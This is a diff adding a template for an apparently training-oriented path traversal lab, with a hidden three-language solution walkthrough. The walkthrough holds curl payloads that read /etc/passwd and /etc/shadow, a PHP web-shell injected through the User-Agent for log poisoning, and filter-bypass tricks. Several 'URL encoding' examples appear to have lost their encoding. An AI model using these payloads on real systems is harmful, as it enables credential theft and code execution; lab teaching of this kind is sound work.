@@ -1,0 +1,188 @@
+{% extends "base.html" %}
+{% block title %}V16 – Path Traversal – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="path_traversal_obj_desc">El parámetro file lee archivos del servidor sin sanear la ruta. Usa path traversal para salir del directorio y leer el archivo secreto con la flag; su contenido se muestra en la página.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <form method="GET" action="/files" class="flex gap-3 items-end mb-4">
+      <div class="flex-1">
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_file_path">Ruta del archivo</label>
+        <input type="text" name="file" value="{{ filename | e }}" placeholder="../../secret/LFI/flag.txt"
+               class="hl-input font-mono" />
+      </div>
+      <button type="submit" class="btn-primary flex-shrink-0" data-i18n="btn_read">Leer</button>
+    </form>
+
+  </div>
+
+  {% if error %}
+  <div class="alert-error mb-4 text-xs font-mono">{{ error }}</div>
+  {% endif %}
+  {% if content %}
+  <div class="hl-card mb-4 border-l-4" style="border-left-color:var(--hl-primary)">
+    <div class="text-xs font-mono mb-2" style="color:var(--hl-primary)">{{ filename }}</div>
+    <pre class="text-gray-700 dark:text-gray-300 text-xs whitespace-pre-wrap break-all">{{ content }}</pre>
+  </div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Path traversal directo</h3>
+    <ol>
+      <li>El parametro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin ninguna validacion. En el formulario web introduce rutas relativas con <code>../</code> para escapar del directorio base y leer archivos del sistema:
+        <pre># En el formulario web (campo "Ruta del archivo"):
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../secret/LFI/flag.txt</pre></li>
+      <li>O con curl usando rutas absolutas o traversal:
+        <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
+curl "{{ target_base }}/files?file=../../../../../etc/shadow"
+curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
+      <li>Lee el log de acceso (preparacion para log poisoning):
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+      <li>Log poisoning (concepto de RCE): envenena el log enviando codigo en el User-Agent:
+        <pre>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" {{ target_base }}/</pre></li>
+      <li>Verifica que el payload quedo registrado en el log:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
+        Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.</li>
+      <li>Directory listing vulnerable y flag dedicada LFI:
+        <pre># Via traversal en el formulario web (desde /app/static/files/ → 2 niveles arriba → /app/secret/):
+../../secret/LFI/flag.txt          # flag LFI
+
+# Via endpoint de directorio expuesto (navegador/curl, no en el formulario LFI):
+curl "{{ target_base }}/secrets"              # directory listing
+curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
+    </ol>
+    <h3>Medium — Bypass de filtro (strips ../ una vez)</h3>
+    <ol>
+      <li>El servidor elimina <code>../</code> pero solo en un unico pase. Usa <code>....//</code> para que tras el reemplazo quede <code>../</code>:
+        <pre>curl "{{ target_base }}/files?file=....//....//etc/passwd"</pre></li>
+      <li>O URL encoding para evadir el filtro de cadena:
+        <pre>curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>Accede al log del servidor con el mismo bypass:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Hard — Bypass de filtro recursivo (double URL encoding)</h3>
+    <ol>
+      <li>El filtro elimina <code>../</code> en bucle. Usa doble URL-encoding (<code>%25</code> es <code>%</code>, por lo que <code>%252e</code> decodifica a <code>%2e</code> que decodifica a <code>.</code>):
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"
+curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>O null byte (en versiones antiguas de PHP para truncar la extension):
+        <pre>curl "{{ target_base }}/files?file=../../etc/passwd%00.jpg"</pre></li>
+      <li>Accede al log con el mismo bypass de doble encoding:
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"
+curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Direct path traversal</h3>
+    <ol>
+      <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without any validation. In the web form enter relative paths with <code>../</code> to escape the base directory and read system files:
+        <pre># In the web form ("File path" field):
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../secret/LFI/flag.txt</pre></li>
+      <li>Or with curl using absolute paths or traversal:
+        <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
+curl "{{ target_base }}/files?file=../../../../../etc/shadow"
+curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
+      <li>Read the access log (preparation for log poisoning):
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+      <li>Log poisoning (RCE concept): poison the log by sending code in the User-Agent:
+        <pre>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" {{ target_base }}/</pre></li>
+      <li>Verify the payload was recorded in the log:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
+        You should see your PHP payload in the output. On an Apache server with mod_php, including this log via LFI would execute the PHP. In HackLabs (Flask) execution does not occur, but the concept is identical to what is exploited in CTFs and real servers.</li>
+      <li>Exposed directory listing and dedicated LFI flag:
+        <pre># Via traversal in the web form (from /app/static/files/ → 2 levels up → /app/secret/):
+../../secret/LFI/flag.txt          # LFI flag
+
+# Via exposed directory endpoint (browser/curl, not in the LFI form):
+curl "{{ target_base }}/secrets"              # directory listing
+curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
+    </ol>
+    <h3>Medium — Filter bypass (strips ../ once)</h3>
+    <ol>
+      <li>The server removes <code>../</code> but only in a single pass. Use <code>....//</code> so that after replacement <code>../</code> remains:
+        <pre>curl "{{ target_base }}/files?file=....//....//etc/passwd"</pre></li>
+      <li>Or URL encoding to evade string-based filtering:
+        <pre>curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>Access the server log with the same bypass:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Hard — Recursive filter bypass (double URL encoding)</h3>
+    <ol>
+      <li>The filter removes <code>../</code> in a loop. Use double URL-encoding (<code>%25</code> is <code>%</code>, so <code>%252e</code> decodes to <code>%2e</code> which decodes to <code>.</code>):
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"
+curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>Or null byte (on old PHP versions to truncate the extension):
+        <pre>curl "{{ target_base }}/files?file=../../etc/passwd%00.jpg"</pre></li>
+      <li>Access the log with the same double-encoding bypass:
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"
+curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Path traversal direto</h3>
+    <ol>
+      <li>O parâmetro <code>file</code> é concatenado com o caminho base <code>static/files/</code> sem nenhuma validação. No formulário web insira caminhos relativos com <code>../</code> para escapar do diretório base e ler arquivos do sistema:
+        <pre># No formulário web (campo "Caminho do arquivo"):
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../secret/LFI/flag.txt</pre></li>
+      <li>Ou com curl usando caminhos absolutos ou traversal:
+        <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
+curl "{{ target_base }}/files?file=../../../../../etc/shadow"
+curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
+      <li>Leia o log de acesso (preparação para log poisoning):
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+      <li>Log poisoning (conceito de RCE): envenene o log enviando código no User-Agent:
+        <pre>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" {{ target_base }}/</pre></li>
+      <li>Verifique se o payload ficou registrado no log:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
+        Você deve ver o seu payload PHP na saída. Em um servidor Apache com mod_php, incluir este log via LFI executaria o PHP. No HackLabs (Flask) a execução não ocorre, mas o conceito é idêntico ao explorado em CTFs e servidores reais.</li>
+      <li>Directory listing exposto e flag dedicada de LFI:
+        <pre># Via traversal no formulário web (de /app/static/files/ → 2 níveis acima → /app/secret/):
+../../secret/LFI/flag.txt          # flag LFI
+
+# Via endpoint de diretório exposto (navegador/curl, não no formulário LFI):
+curl "{{ target_base }}/secrets"              # directory listing
+curl "{{ target_base }}/secrets/LFI/flag.txt"</pre></li>
+    </ol>
+    <h3>Médio — Bypass de filtro (remove ../ uma única vez)</h3>
+    <ol>
+      <li>O servidor remove <code>../</code>, mas apenas em uma única passagem. Use <code>....//</code> para que após a substituição reste <code>../</code>:
+        <pre>curl "{{ target_base }}/files?file=....//....//etc/passwd"</pre></li>
+      <li>Ou URL encoding para burlar a filtragem baseada em string:
+        <pre>curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>Acesse o log do servidor com o mesmo bypass:
+        <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Difícil — Bypass de filtro recursivo (double URL encoding)</h3>
+    <ol>
+      <li>O filtro remove <code>../</code> em loop. Use double URL-encoding (<code>%25</code> é <code>%</code>, portanto <code>%252e</code> decodifica para <code>%2e</code> que decodifica para <code>.</code>):
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252fetc/passwd"
+curl "{{ target_base }}/files?file=/etc/passwd"</pre></li>
+      <li>Ou null byte (em versões antigas do PHP para truncar a extensão):
+        <pre>curl "{{ target_base }}/files?file=../../etc/passwd%00.jpg"</pre></li>
+      <li>Acesse o log com o mesmo bypass de duplo encoding:
+        <pre>curl "{{ target_base }}/files?file=%252e%252e%252f%252e%252e%252flogs/access.log"
+curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span></div>
+  </div>
+</div>
+{% endblock %}
